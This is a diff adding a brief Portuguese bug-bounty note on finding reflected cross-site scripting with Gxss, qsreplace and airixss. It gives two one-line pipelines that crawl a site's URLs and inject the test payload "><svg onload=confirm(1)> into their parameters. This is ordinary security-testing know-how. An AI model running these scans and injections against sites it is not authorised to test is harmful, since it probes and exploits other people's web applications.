@@ -1,0 +1,10 @@
+O GXSS COLETA APENAS AS URLs QUE REFLETEM O PARÂMETRO NO CÓDIGO, QSREPLACE INSERE O PAYLOAD EM UMA URL QUE TENHA PARÂMETROS E O AIRIXSS É UMA FERRAMENTA QUE ANALISA SE A PAYLOAD FOI REFLETIDA NO CÓDIGO.
+	
+	PODE UTILIZAR UM ARQUIVO COM DIVERSAS URLs COM PARÂMETROS.
+	
+	COMANDO: cat urlscomparam.txt | Gxss | qsreplace "><svg onload=confirm(1)>" | airixss "confirm(1)"
+	
+	OU FAZER TUDO EM UMA ONELINE.
+	
+	COMANDO: echo site.com | httpx -silent | hakrawler -subs | grep '=' | Gxss | qsreplace "><svg 
+	onload=confirm(1)>" | airixss -p "confirm(1)"
